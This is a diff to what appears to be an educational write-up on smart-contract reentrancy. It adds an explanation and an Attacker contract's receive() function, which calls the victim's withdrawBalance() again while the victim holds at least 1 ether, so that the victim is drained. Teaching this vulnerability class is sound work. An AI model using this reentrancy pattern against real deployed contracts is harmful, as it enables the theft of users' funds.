@@ -107,3 +107,13 @@ function attack() public payable {
             revert();
         }
 ```
+
+- What happens when a contract receives value? It's going have it's receive/fallback functions triggered. And what does our Attacker's receive function look like?
+
+```js
+receive() external payable {
+        if (address(victim).balance >= 1 ether) {
+            victim.withdrawBalance();
+        }
+    }
+```
